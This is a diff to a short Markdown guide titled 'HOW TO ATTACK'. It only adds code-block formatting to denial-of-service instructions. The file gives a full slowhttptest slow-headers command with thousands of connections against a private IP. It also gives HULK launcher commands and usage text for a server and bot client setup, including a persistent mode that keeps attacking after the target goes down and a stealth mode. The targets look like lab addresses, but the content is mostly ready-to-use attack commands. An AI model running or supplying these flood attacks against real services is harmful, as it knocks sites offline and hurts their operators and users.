@@ -1,7 +1,9 @@
 # HOW TO ATTACK
 
-## slowhttptest
+## Slowhttptest
+```
 slowhttptest -H -g -c 5260 -i 10 -r 30 -t GET -u http://10.100.0.2:3000/ -x 24 -p 3
+```
 
     -H: Enable slow headers attack
     -g: Generate headers randomly
@@ -14,11 +16,14 @@ slowhttptest -H -g -c 5260 -i 10 -r 30 -t GET -u http://10.100.0.2:3000/ -x 24 -
     -p 3: Number of child processes to fork
 
 ## hulk
+```
 python3 HULK-v3/hulk_launcher.py server -p 3000 http://100.10.0.2:3000
-
+```
+```
 python3 HULK-v3/hulk_launcher.py client -n 10
-
+```
 ### Server :computer:
+```
 usage: hulk_launcher.py server [-h] [-p PORT] [-m MAX_MISSILES] [--persistent] [--gui] target
 
 The Hulk Server Launcher
@@ -32,9 +37,10 @@ options:
 -m MAX_MISSILES, --max_missiles MAX_MISSILES the maximum number of missiles to connect to.
 --persistent          keep attacking even after target goes down.
 --gui                 run on the GUI mode.
-
+```
 
 ### Client :space_invader:
+```
 usage: hulk_launcher.py client [-h] [-r ROOT_IP] [-p ROOT_PORT] [-n NUM_PROCESSES] [-s]
 
 The Hulk Bot Launcher
@@ -46,5 +52,3 @@ options:
 -n NUM_PROCESSES, --num_processes NUM_PROCESSES      Number of Processes to launch.
 -s, --stealth         Stealth mode.
 ```
-
-
